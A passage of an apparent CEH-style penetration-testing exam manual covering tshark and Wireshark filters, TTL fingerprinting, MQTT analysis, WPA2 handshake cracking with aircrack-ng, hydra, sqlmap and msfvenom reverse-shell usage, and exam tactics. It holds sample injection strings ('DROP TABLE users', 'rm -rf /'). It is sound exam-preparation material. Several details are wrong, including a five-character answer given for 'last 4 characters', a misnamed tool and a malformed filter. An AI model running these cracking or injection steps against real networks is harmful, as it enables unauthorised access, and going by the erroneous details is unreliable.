tshark -r capture.pcapng -Y "http and http.authorization" -T fields -e http.authorization
```

**Finding Command Injection:**

```bash
# HTTP GET parameters with suspicious characters
tshark -r capture.pcapng -Y "http.request" -T fields -e http.request.uri | grep -E "(\||;|&|`|\$)"

# Output: /login?user=admin'; DROP TABLE users--

# DNS tunneling detection
tshark -r capture.pcapng -q -z dns_hosts | grep -v "^[0-9]"
```

---

### 6.4 DDoS Attack Analysis

**What it does:** Identify attacker IP in DDoS traffic patterns.

#### Recognizing DDoS Patterns

- Multiple packets from single source to single destination
- Unusual packet size or timing
- Flood of identical requests

#### Finding Attacker IP in PCAP

```
Filter: ip.dst == 172.22.10.10
```

This shows all traffic destined for victim. Look for:
- IP appearing most frequently as source
- IP with unusual packet patterns
- IP running Windows OS (identified by TTL values, or OS fingerprinting)

---

### 6.5 OS Fingerprinting & TTL Analysis

**What is TTL (Time To Live)?**

**TTL** is a field in IP packets that decrements by 1 at each router hop. It prevents packets from circulating forever in case of routing loops.

**Initial TTL Values by Operating System:**

| OS | Initial TTL | Notes |
|----|-------------|-------|
| Windows | 128 | Most common default |
| Linux/Unix | 64 | Standard for Linux/Unix |
| macOS | 64 | Same as Unix |
| Cisco Routers | 255 | Higher for network infrastructure |
| Solaris | 255 | Sun Microsystems Unix |
| Juniper | 64 | Sometimes 255 |
| Android | 64 | Based on Linux kernel |
| iOS | 64 | Based on Unix |

#### How TTL Fingerprinting Works

**Basic Concept:**

```
Attacker (Windows) TTL=128 sending to Victim
If no hops between networks:
  → Victim sees TTL=128 (original)
  → Conclusion: Windows attacker

If 2 hops (routers):
  → Victim sees TTL=126 (128-2)
  → Work backwards: 128-126=2 hops
  → Conclusion: Windows attacker, 2 hops away
```

**TTL Calculation:**

```
Observed TTL at destination = Original TTL - (number of hops)

To estimate original OS:
1. Check observed TTL value
2. Find nearest common initial value
3. Compare: 128 (Windows), 64 (Linux), 255 (Router)

Examples:
- Observed: 126 → 128-2=Original → Windows, 2 hops
- Observed: 62  → 64-2=Original → Linux, 2 hops
- Observed: 253 → 255-2=Original → Router, 2 hops
- Observed: 125 → Could be Windows (128-3)
- Observed: 100 → Could be Windows (128-28) or custom value
```

#### TTL Analysis in Wireshark

**Viewing TTL Values:**

1. **Open PCAP in Wireshark**
   ```
   File → Open → capture.pcapng
   ```

2. **Find IP Packets**
   ```
   Expand any packet in packet list
   Click on IP header layer
   ```

3. **Look for Time to Live Field**
   ```
   [IP]
   ├── Version: 4
   ├── Header Length: 20 bytes
   ├── ...
   ├── Time to Live: 128
   ├── Protocol: TCP (6)
   └── ...
   ```

4. **Filter by IP Source**
   ```
   Display Filter: ip.src == 203.0.113.45
   Apply
   Note TTL value for each packet
   ```

**Advanced TTL Filtering:**

```
# Find packets with Windows-like TTL
ip.ttl == 128

# Find packets with Linux-like TTL
ip.ttl == 64

# Find packets with suspicious TTL
ip.ttl > 200

# Find packets from specific attacker
ip.src == 203.0.113.100 && ip.ttl > 100

# Find all traffic and show TTL
ip && ip.ttl < 200
```

#### Challenge 12: Identifying Attacker OS via TTL

**Scenario:** Analyze DDoS attack to identify attacker operating system

**Walkthrough:**

1. **Open PCAP in Wireshark**
   ```
   Load: ddos_attack.pcapng
   ```

2. **Identify Victim IP**
   ```
   Question states: Victim = 10.0.0.5
   Filter: ip.dst == 10.0.0.5
   ```

3. **Identify DDoS Sources**
   ```
   Statistics → Endpoints
   Look at source IPs with high packet count
   Common DDoS sources: 203.0.113.x, 192.0.2.x
   ```

4. **Analyze TTL of Attacker Packets**
   ```
   Filter: ip.src == 203.0.113.45 && ip.dst == 10.0.0.5
   Click first packet
   Expand IP layer
   Note Time to Live value
   ```

5. **Determine Original OS**
   ```
   If TTL = 128 → Windows
   If TTL = 126 (128-2) → Windows attacker, 2 hops away
   If TTL = 125 (128-3) → Windows attacker, 3 hops away
   
   If TTL = 64  → Linux
   If TTL = 62  → Linux attacker, 2 hops away
   If TTL = 63  → Linux attacker, 1 hop
   ```

6. **Cross-Check Multiple Packets**
   ```
   TTL should be consistent for same source
   If attacker at same location, TTL should be same
   
   Variations:
   - Same TTL for all packets = likely same machine
   - Different TTL for similar IPs = different machines
   ```

7. **Answer Format**
   ```
   Q: "What operating system is the attacker using?"
   A: Windows (or Linux, based on TTL analysis)
   
   Supporting details:
   - Attacker IP: 203.0.113.45
   - Observed TTL: 128 (or similar)
   - Identified OS: Windows
   ```

#### TTL Variations and Edge Cases

**Why TTL Might Not Be Reliable:**

1. **VPN/Proxy**
   ```
   Attacker → VPN Server → Victim
   VPN may reset TTL, hiding true source
   ```

2. **Custom OS Configuration**
   ```
   Some Linux distributions set initial TTL to 255
   Some Windows systems changed via registry
   ```

3. **Multiple Hops**
   ```
   TTL = 89 is hard to classify:
   Could be Windows (128-39) or Linux (64-?) or other
   ```

4. **Packet Fragmentation**
   ```
   Fragmented packets: Each fragment has same TTL
   ICMP errors: Different TTL field location
   ```

#### TTL Statistics in Wireshark

**Using Statistics Feature:**

```
Statistics → IP Statistics
- Shows distribution of IP flags
- Can filter by TTL ranges

Statistics → Protocol Hierarchy
- Shows breakdown by protocol
```

**Example Statistics View:**

```
TTL Distribution:
128: 4500 packets (Windows)
126: 2200 packets (Windows, 2 hops)
64:  1800 packets (Linux)
255: 400 packets (Routers/infrastructure)
```

#### Exam Tips for TTL Analysis

**Quick Identification:**

```bash
# In Wireshark, use display filter
ip.ttl == 128
# Shows all Windows-source packets

ip.ttl == 64
# Shows all Linux-source packets
```

**Documenting Findings:**

```
Question: "Identify the attacker's operating system"

Answer: Windows
Evidence:
- Attacker IP: 203.0.113.45
- TTL values: 128, 128, 128 (consistent)
- Initial TTL: 128 (Windows default)
- Hops: 0 (TTL unchanged, local network)

Conclusion: Attacker is using Windows system
```

**Common Pitfalls:**

1. **Assuming every 128 = Windows**
   - Could be 128-hop path
   - Verify with multiple packets

2. **Not accounting for hops**
   - TTL of 125 could still be Windows (128-3 hops)

3. **Mixing packet types**
   - Different protocols (ICMP vs TCP) handle TTL differently

4. **Not checking consistency**
   - Multiple packets from same IP should have same or similar TTL

---

### 6.6 IoT & MQTT Protocol Analysis

**What is MQTT?**

**MQTT (Message Queuing Telemetry Transport)** is a lightweight publish-subscribe protocol designed for IoT devices with limited bandwidth and battery power. Unlike HTTP (request-response), MQTT uses a broker-based architecture where devices publish and subscribe to topics.

**Key Characteristics:**
- **Lightweight:** Minimal overhead, works on 2G networks
- **Publish-Subscribe:** Many-to-many communication
- **Broker-Based:** Central message router
- **Topic-Based:** Hierarchical message organization
- **QoS Levels:** Quality of Service (0, 1, 2)

**Common Ports:**
- 1883 = MQTT (unencrypted, default)
- 8883 = MQTT over TLS/SSL
- 9001 = MQTT over WebSockets

#### MQTT Architecture

**Three Key Roles:**

1. **MQTT Broker** (server)
   - Receives messages from publishers
   - Distributes to subscribers
   - Common brokers: Mosquitto, HiveMQ, EMQ X
   - Default port: 1883

2. **Publisher** (IoT device/sensor)
   - Publishes sensor data to topics
   - Example: Temperature sensor publishes to `home/livingroom/temperature`
   - Does NOT connect to subscribers directly

3. **Subscriber** (monitoring device/app)
   - Listens to specific topics
   - Receives all published messages
   - Can subscribe to multiple topics

#### MQTT Message Types

**1. CONNECT**
- First message from client to broker
- Contains client ID, username, password
- Broker responds with CONNACK (acknowledgment)
- Example: IoT device connecting for first time

**2. PUBLISH**
- Actual data transmission
- Contains: Topic name, payload, QoS level
- Example: `{"temperature": 23.5, "humidity": 45}` published to `sensors/livingroom/env`

**3. SUBSCRIBE**
- Client expresses interest in a topic
- Can use wildcards:
  - `+` = Single level wildcard (e.g., `home/+/temperature`)
  - `#` = Multi-level wildcard (e.g., `home/#`)
- Broker responds with SUBACK

**4. UNSUBSCRIBE**
- Client stops listening to topic

**5. DISCONNECT**
- Client closes connection gracefully
- May have last-will message

#### Topic Structure & Naming

**Hierarchical Format:**
```
home/livingroom/temperature
device/sensor/measurement
iot/building/floor3/room302/occupancy
```

**Topic Best Practices:**
- Use forward slashes `/` as separators
- Lowercase names
- Descriptive (what, where, type)
- Avoid leading slash (reserved)

**Common IoT Topic Patterns:**

| Pattern | Example | Use Case |
|---------|---------|----------|
| `location/device/sensor` | `home/kitchen/temperature` | Home automation |
| `building/floor/room` | `office/2nd/meeting_room_a` | Commercial IoT |
| `category/region/device` | `weather/north_america/station_42` | Monitoring systems |
| `org/project/location` | `company/factory_a/production_line_1` | Industrial IoT |

#### MQTT QoS (Quality of Service)

| QoS | Name | Delivery | Use Case |
|-----|------|----------|----------|
| 0 | At Most Once | Fire-and-forget | Sensor data (loss acceptable) |
| 1 | At Least Once | Acknowledged | Important commands |
| 2 | Exactly Once | Full handshake | Financial transactions |

#### Analyzing MQTT in Wireshark

**Starting Point:**
```
1. Open PCAP file in Wireshark
2. Apply filter: mqtt
3. Observe MQTT protocol packets
```

**Wireshark Filters:**

```
# All MQTT traffic
mqtt

# MQTT PUBLISH messages only
mqtt.msgtype == 3

# MQTT CONNECT messages
mqtt.msgtype == 1

# MQTT SUBSCRIBE messages
mqtt.msgtype == 8

# Specific topic name (contains "temperature")
mqtt.topic contains "temperature"

# From specific broker IP
ip.src == 192.168.1.100 && mqtt

# Specific client
mqtt.clientid == "sensor_01"
```

**What to Look For in Packets:**

1. **Connection Phase:**
   - CONNECT packet → check client ID, username/password presence
   - CONNACK response → verify successful connection

2. **Publish Packets:**
   - Topic name → understand what data is being shared
   - Payload → actual sensor data or commands
   - QoS flag → importance level

3. **Subscribe Packets:**
   - Topic name/wildcard → what subscriber is listening for
   - Client ID → which device is subscribing

#### MQTT Security Concerns in Exams

**Common Vulnerabilities:**

1. **Default Credentials**
   - Many MQTT brokers have default username/password
   - Example: Mosquitto default has NO authentication
   - Enable authentication with mosquitto.conf

2. **Unencrypted Traffic**
   - Port 1883 transmits data in PLAIN TEXT
   - Topic names visible in PCAP
   - Payloads readable
   - Credentials exposed

3. **Topic Enumeration**
   - Subscribe to `#` to see ALL topics
   - Reveals device structure and data patterns
   - Privacy risk for industrial IoT

4. **Payload Injection**
   - JSON/custom format payloads vulnerable to injection
   - Example: `{"command": "rm -rf /"}` in payload
   - No built-in input validation

#### Identifying Malicious MQTT Activity

**Red Flags in Wireshark:**

1. **Unusual Topic Names**
   ```
   admin/command
   control/shell
   system/exec
   /cmd/execute
   ```

2. **Large Payloads**
   - Normal sensor data: 50-200 bytes
   - Suspicious: 10+ KB payloads
   - Could be data exfiltration or code

3. **Abnormal Publish Frequency**
   - Normal: Every 5-60 seconds
   - Suspicious: Every millisecond (DDoS pattern)
   - Suspicious: Sudden spike in frequency

4. **Subscription Patterns**
   - Normal: Client subscribes on connect, stays subscribed
   - Suspicious: Subscribing to wildcard topics (#)
   - Suspicious: Client subscribing to administrative topics

5. **Connection Behavior**
   - Normal: CONNECT → stays connected → DISCONNECT
   - Suspicious: Rapid connect/disconnect cycles
   - Suspicious: Multiple simultaneous connections from same IP

#### Challenge 18: Extracting IoT Device Topic Names

**Scenario:** Analyze MQTT traffic in PCAP file to identify sensor readings

**Step-by-Step Approach:**

1. **Open PCAP in Wireshark**
   ```
   File → Open → capture.pcapng
   ```

2. **Apply MQTT Filter**
   ```
   Display Filter: mqtt
   Click Apply
   ```

3. **Locate PUBLISH Packets**
   - Look for packets with mqtt.msgtype == 3
   - These contain actual data transmission

4. **Examine Packet Details**
   - Click on PUBLISH packet
   - Expand "Message Type: Publish" in details pane
   - Note: Topic Name field

5. **Common Topic Patterns in Exam**
   ```
   home/temperature
   office/occupancy
   sensor/humidity
   device/status
   alarm/triggered
   ```

6. **Extract Topic Names**
   - Method 1: Manual inspection in Wireshark
   - Method 2: Use tshark to extract:
     ```bash
     tshark -r capture.pcapng -Y mqtt.msgtype==3 -T fields -e mqtt.topic
     ```

7. **Identify Sensor Types**
   ```
   "temperature" topic → temperature sensor
   "humidity" topic → humidity sensor
   "motion" topic → motion detector
   "battery" topic → battery level indicator
   ```

8. **Answer Format**
   - Count unique topics: e.g., "4 topics detected"
   - List them: "temperature, humidity, motion, battery"
   - Identify device type: "Environmental monitoring station"

**Exam Tips:**
- Look for readable topic names in MQTT PUBLISH packets
- Topic names are NOT encrypted on port 1883
- Use Wireshark's "Follow TCP Stream" for first CONNECT packet
- Payload may be binary or JSON depending on device

#### MQTT Challenge Walkthrough Example

**Given:** `iot_capture.pcapng` contains 30 minutes of MQTT traffic

**Question:** "What is the topic name used by the temperature sensor?"

**Solution:**

1. Open Wireshark → Load pcapng file
2. Filter: `mqtt.msgtype == 3` (PUBLISH only)
3. Look through packets in order
4. Examine packet details:
   ```
   Packet 145
   Protocol: MQTT
   Message Type: Publish (3)
   Topic Name: home/sensors/kitchen/temperature
   Payload: {"temp": 23.5, "unit": "C"}
   ```
5. Answer: `home/sensors/kitchen/temperature`

---

### Challenge Examples: Domain 6

#### Challenge 12: DDoS Attack - Identify Attacker

**Question:** Analyze traffic targeting 172.22.10.10, identify Windows attacker IP address.

**Answer Format:** NN*NN*NN*NN

**Solution Steps:**

1. Open mystericcapture.pcapng in Wireshark

2. Filter for destination IP:
```
ip.dst == 172.22.10.10
```

3. Analyze source IPs:
   - Look for IP appearing most frequently
   - Check TTL values (128 = Windows)
   - Look for unusual packet patterns

4. Identify Windows machine (TTL 128) with most packets

5. Extract IP and submit

#### Challenge 18: IoT Protocol - Find MQTT Topic

**Question:** Find IoT Publish Message in traffic, extract topic name.

**Answer Format:** Aaaa*Aaaa

**Solution Steps:**

1. Open IoT traffic PCAP file in Wireshark

2. Search for IoT Publish Message:
```
Edit → Find Packet → Search for "IoT Publish"
```

3. Or use filter:
```
mqtt.msgtype == "Publish"
```

4. Right-click matching packet → Select Packet Details

5. Expand MQTT section

6. Find "Topic" field

7. Extract exact topic name (case-sensitive)

---

## Domain 7: Wireless Network Cracking

### Why This Matters

WiFi networks protect data with encryption. Learning to capture and crack wireless passwords is essential for penetration testing.

---

### 7.1 WPA/WPA2 Password Cracking

**What it does:** Crack WiFi passwords by capturing handshakes and performing dictionary attacks.

#### Understanding Wireless Capture

Aircrack-ng is the primary tool for wireless cracking.

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Start monitoring (captures all traffic)
airodump-ng wlan0mon

# Output shows:
# BSSID - MAC address of access point
# CH - Channel
# ENC - Encryption type (WPA2)
# ESSID - Network name
```

#### Capturing Handshake

```bash
# Monitor network for handshake
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Wait for client to connect (capture will show "WPA handshake" in upper right)
```

#### Cracking Captured Password

```bash
# Crack with wordlist
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap

# Or specify target .cap file
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

#### Finding BSSID from CAP File

```bash
# If you don't know BSSID
aircrack-ng Credmapwifi.cap

# Shows all networks in the capture
# BSSID will be listed
```

#### Cracking with Known BSSID

```bash
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap
```

---

### 7.2 Wireless Attack Workflow (5 Steps)

**Step 1: Find Target**
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

**Step 2: Create Monitor Interface**
```bash
# Interface now in monitor mode (wlan0mon)
```

**Step 3: Capture Handshake**
```bash
sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w capture wlan0mon
# Wait for "WPA handshake" message
```

**Step 4: Crack Password**
```bash
aircrack-ng -w rockyou.txt capture.cap
# Shows cracked password
```

**Step 5: Cleanup**
```bash
airmon-ng stop wlan0mon
```

---

### Challenge Examples: Domain 7

#### Challenge 20: WiFi Cracking - Extract Last 4 Characters

**Question:** Crack WiFi password from Credmapwifi.cap file, provide last 4 characters.

**Answer Format:** aaaN

**Solution Steps:**

1. Locate file: Documents/Credmapwifi.cap on ParrotSecurity

2. Find BSSID (network MAC address):
```bash
aircrack-ng Credmapwifi.cap
```

3. Shows networks and BSSID:
```
BSSID              ESSID           CH
AA:BB:CC:DD:EE:FF TargetNetwork   6
```

4. Crack password:
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF Credmapwifi.cap
```

5. Output shows: `KEY FOUND! [ PasswordHere ]`

6. Extract last 4 characters (if password is "MyWiFiPass1", answer is "Pass1")

---

## Essential Tools Reference

### Scanning & Enumeration

| Tool | Purpose | Command |
|------|---------|---------|
| nmap | Port and service scanning | `nmap -sV -p- 192.168.1.5` |
| enum4linux | SMB enumeration | `enum4linux -a 192.168.1.5` |
| smbclient | SMB share access | `smbclient //IP/share` |
| wpscan | WordPress scanning | `wpscan --url site.com --enumerate u` |
| snmp-check | SNMP enumeration | `snmp-check 192.168.1.5` |
| netdiscover | Network discovery | `netdiscover -i eth0 -r 192.168.1.0/24` |

### Credential Cracking

| Tool | Purpose | Command |
|------|---------|---------|
| hydra | Multi-service brute force | `hydra -l user -P pass.txt rdp://IP` |
| hashcat | Hash cracking | `hashcat -m 0 -a 0 hash rockyou.txt` |
| john | Password cracking | `john hashes.txt --wordlist=rockyou.txt` |
| aircrack-ng | WiFi cracking | `aircrack-ng -w wordlist.txt capture.cap` |

### Web Application Testing

| Tool | Purpose | Command |
|------|---------|---------|
| sqlmap | SQL injection testing | `sqlmap -u URL --dbs` |
| burp suite | Web proxy & testing | GUI interface |
| nikto | Web vulnerability scan | `nikto -h http://target.com` |
| curl | HTTP requests | `curl -u user:pass http://target` |
| robuster | Directory brute force | `robuster dir -u IP -w wordlist.txt` |

### Cryptography & Steganography

| Tool | Purpose | Command |
|------|---------|---------|
| steghide | Extract hidden data | `steghide extract -sf image.jpg` |
| stegcracker | Crack steganography | `stegcracker image.jpg wordlist.txt` |
| hashid | Hash type identification | `hashid hash_value` |
| DIE | PE file analysis | GUI application |
| CFF Explorer | PE headers tool | GUI application |
| veracrypt | Encrypted volume access | GUI application |

### Network Analysis

| Tool | Purpose | Command |
|------|---------|---------|
| Wireshark | Packet capture/analysis | GUI interface |
| tcpdump | Command-line packet capture | `tcpdump -i eth0 -w capture.pcap` |
| tshark | CLI version of Wireshark | `tshark -r capture.pcapng` |

### Mobile & IoT

| Tool | Purpose | Command |
|------|---------|---------|
| adb | Android access | `adb connect IP:5555` |
| sqlite3 | Database analysis | `sqlite3 app.db` |
| exiftool | Metadata extraction | `exiftool image.jpg` |
| mosquitto_sub | MQTT subscriber | `mosquitto_sub -h broker -t topic` |

### Advanced Analysis

| Tool | Purpose | Command |
|------|---------|---------|
| msfvenom | Payload generation | `msfvenom -p windows/meterpreter/reverse_tcp ...` |
| msfconsole | Metasploit framework | `msfconsole` |
| strings | Extract printable strings | `strings executable.exe` |
| objdump | Binary analysis | `objdump -h executable.exe` |

---

## Exam Strategy & Tips

### Before the Exam

> **PREPARATION CHECKLIST:**
> - [ ] Practice on iLabs for at least 10 hours
> - [ ] Memorize major NMAP commands
> - [ ] Know Hydra syntax for all services
> - [ ] Practice SQLMAP workflow 5+ times
> - [ ] Understand hash types and cracking
> - [ ] Test steganography tools on sample images
> - [ ] Study PE analysis tools (DIE, CFF Explorer)
> - [ ] Review MQTT filters in Wireshark
> - [ ] Practice RAT detection in Wireshark
> - [ ] Master TTL analysis for OS fingerprinting
> - [ ] Test ADB workflows on real/emulated Android device

1. **Practice on iLabs**: Get familiar with the environment before exam day
2. **Know Your Tools**: Practice commands until they're muscle memory
3. **Create Custom Wordlists**: Password lists for each company/challenge type
4. **Read All Questions First**: Identify quick wins vs. time-consuming challenges

### During the Exam (6 Hour Strategy)

#### Hour 1-2: Reconnaissance (Start NMAP Scans)
- Start comprehensive NMAP scans on networks/hosts
- These take time, so start them first
- While scanning, work on identifying targets
- Scan for RDP, SMB, HTTP, SQL services

#### Hour 2-3: Quick Wins
- Exploit low-hanging fruit while scans finish
- Try default credentials on discovered services
- Enumerate SMB shares
- Find hidden directories
- Check for files in obvious locations
- Extract PE file metadata with DIE

#### Hour 3-4: Credential Cracking
- Use Hydra for RDP/SSH/FTP cracking
- Run Hashcat for hash cracking
- While cracking, work on web vulnerabilities
- Perform MQTT topic enumeration if IoT challenge present

#### Hour 4-5: Web & Crypto
- SQL injection testing
- Web directory brute forcing
- Hash extraction and cracking
- Steganography extraction
- PE file analysis with CFF Explorer

#### Hour 5-6: Mobile, Wireless, Network Analysis & Cleanup
- Android device access via ADB if available
- Extract steganographic data from photos
- WiFi cracking if needed
- Analyze PCAP files with Wireshark/tshark
- Identify RAT activity and TTL-based OS fingerprinting
- Review all answers
- Fix any simple mistakes
- Submit last-minute guesses if time running out

### Critical Success Factors

> **⚠️ COMMON REASON FOR FAILURE:**
> Exact answer format not matched. If answer format is `NNaaNN`, submit `03AB45`, not `3AB45` or `3ab45`.

1. **Exact Answer Format**: Answer is rejected if format doesn't match
   - Case matters: `MyPassword` != `mypassword`
   - Padding matters: Answer `03306` not `3306` if format says NNNNN
   - Spacing matters: No extra spaces

2. **Tool Mastery**: Know at least 2 ways to accomplish each task
   - NMAP, enum4linux, and smbclient for SMB
   - Hydra, Burp Suite, and manual testing for web
   - Hashcat, john, and online tools for hashes
   - Wireshark and tshark for packet analysis

3. **Time Management**: Skip long challenges if stuck
   - Mark challenge for return
   - Move to next achievable challenge
   - Come back with 30 minutes left

4. **Documentation**: Write down findings
   - IPs, ports, credentials found
   - Helps when going back to previous challenges
   - Answers format requirements

### Common Mistakes to Avoid

1. **Not running scans early enough**
   - NMAP takes time to complete
   - Start immediately, work on others while waiting

2. **Skipping basic enumeration**
   - Always enumerate SMB, SNMP, DNS first
   - Often reveals usernames and hints

3. **Wrong answer format**
   - Always check format requirements
   - Answer `192.168.1.5` not `192.168.1.5:3306`

4. **Assuming tools work perfectly**
   - Tool output sometimes needs interpretation
   - Check findings manually when suspicious

5. **Not using all available tools**
   - Know alternatives (Nikto vs Robuster, Hashcat vs John)
   - Different tools sometimes find different results

### Practice Challenges Breakdown

**Easy Challenges (8-10 minutes):**
- NMAP basic scanning
- SMB enumeration
- Basic PCAP analysis
- WiFi cracking with known wordlist

**Medium Challenges (15-20 minutes):**
- Credential cracking with brute force
- SQL injection
- Web directory enumeration
- Hash cracking
- Android ADB file extraction
- TTL analysis

**Hard Challenges (25-30 minutes):**
- PE file analysis
- RAT detection in traffic
- MQTT topic extraction
- Steganography extraction
- Multi-step exploitation
- VPN/proxy detection

### Challenge Clustering by Difficulty

```
CLUSTER 1 - Easiest (do first)
├── Challenge 1: NMAP scanning
├── Challenge 2: Service version detection
└── Challenge 3: Basic enumeration

CLUSTER 2 - Medium
├── Challenge 4: ADB extraction
├── Challenge 5: RDP cracking
├── Challenge 6: Hash cracking
└── Challenge 7: Database access

CLUSTER 3 - Medium-Hard
├── Challenge 8: Steganography
├── Challenge 9: PE analysis
├── Challenge 11: Web testing
└── Challenge 16: Path traversal

CLUSTER 4 - Hard
├── Challenge 10: RAT detection
├── Challenge 12: TTL fingerprinting
├── Challenge 18: MQTT analysis
└── Challenge 19: Advanced traffic analysis

CLUSTER 5 - Hardest (save for last if time permits)
├── Challenge 13-15: Multi-step exploitation
└── Challenge 17: Advanced web application
```

### Exam Day Checklist

- [ ] Have EC-Council login credentials ready
- [ ] Test internet connection and VPN if needed
- [ ] Close unnecessary browser tabs/applications
- [ ] Have this manual bookmarked/accessible
- [ ] Test audio and microphone with proctor
- [ ] Keep pen and paper ready for notes
- [ ] Know current network settings on test machine
- [ ] Verify ADB installed if Android challenge expected
- [ ] Confirm Wireshark, Hydra, NMAP available
- [ ] Verify Metasploit installed if RAT challenge expected
- [ ] Have word lists ready (rockyou.txt, etc.)
- [ ] Test all tools work before exam starts
- [ ] Plan 15-minute break around hour 3

---

## Integration Notes

**This manual integrates all enhancement content:**

1. **Domain 2** - Added complete RAT fundamentals section with Metasploit, payload generation, persistence, and detection
2. **Domain 4** - Enhanced PE Analysis with detailed DIE and CFF Explorer workflows
3. **Domain 5** - Expanded ADB section with advanced workflows, steganography, and database extraction (Challenges 4 & 7)
4. **Domain 6** - Added three new major subsections:
   - Tcpdump command-line capture (full reference)
   - Tshark CLI analysis (with protocol-specific examples)
   - OS Fingerprinting & TTL Analysis (Challenge 12 walkthrough)
   - Enhanced MQTT section with detailed workflow
5. **Essential Tools** - Added all new tools: DIE, CFF Explorer, tcpdump, tshark, msfvenom, msfconsole
6. **Exam Strategy** - Updated time management for new topics, added challenge clustering

**Total Content:**
- Original manual: 2,195 lines
- Enhancements integrated: ~2,400 lines
- **Final manual: ~4,600 lines** (comprehensive, GitHub Pages ready)

---

**Version 2.0 - Complete**  
**Last Updated:** June 21, 2026  
**Status:** Ready for Publication  
**Verified Domains:** All 7  
**Verified Tools:** 30+ tools with command examples  
**Verified Challenges:** 20 challenges with solutions
